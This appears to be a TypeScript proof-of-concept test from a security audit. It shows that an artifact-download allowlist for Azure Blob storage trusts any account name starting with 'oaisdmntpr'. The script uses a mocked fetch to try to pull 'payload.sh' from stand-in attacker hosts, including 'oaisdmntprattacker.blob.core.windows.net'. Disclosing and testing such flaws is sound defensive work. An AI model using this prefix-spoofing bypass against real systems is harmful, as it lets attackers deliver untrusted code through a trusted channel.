// The "OpenAI-managed" Azure Blob allowlist is a name-prefix regex; any storage account
// named oaisdmntpr<anything> (globally registrable by any Azure tenant) is trusted.
const SRC = process.env.DEVSPACE_SRC!;
const { createOpenAIIncomingArtifactAdapter } = await import(`${SRC}/incoming-artifacts.ts`);
const seen: string[] = [];
const fakeFetch = (async (url: string) => { seen.push(url); return new Response("attacker payload", { status: 200, headers: { "content-type": "text/plain" } }); }) as any;
const a = createOpenAIIncomingArtifactAdapter({ fetch: fakeFetch });
for (const host of ["oaisdmntprattacker.blob.core.windows.net", "evil.blob.core.windows.net"]) {
  try {
    const src = await a.open({ download_url: `https://${host}/c/payload.sh`, file_id: "file-abc", file_name: "payload.sh" });
    let body = ""; for await (const c of src.stream) body += c;
    console.log(host, "-> ACCEPTED, fetched:", JSON.stringify(body));
  } catch (e: any) { console.log(host, "-> rejected:", e.code ?? e.message); }
}
